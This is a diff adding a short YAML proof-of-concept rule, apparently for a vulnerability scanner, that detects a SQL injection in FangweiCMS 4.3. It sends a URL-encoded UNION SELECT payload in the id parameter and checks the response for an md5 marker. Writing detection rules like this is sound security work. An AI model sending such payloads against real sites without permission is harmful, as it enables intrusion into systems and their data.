@@ -1,0 +1,11 @@
+name: poc-yaml-fangweicms-sqli
+rules:
+  - method: GET
+    path: /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5%289527%29%29%23
+    expression: |
+      response.body.bcontains(b"52569c045dc348f12dfc4c85000ad832")
+detail:
+  author: rexus
+  Affected Version: "4.3"
+  links:
+    - http://www.wujunjie.net/index.php/2015/08/02/%E6%96%B9%E7%BB%B4%E5%9B%A2%E8%B4%AD4-3%E6%9C%80%E6%96%B0%E7%89%88sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/
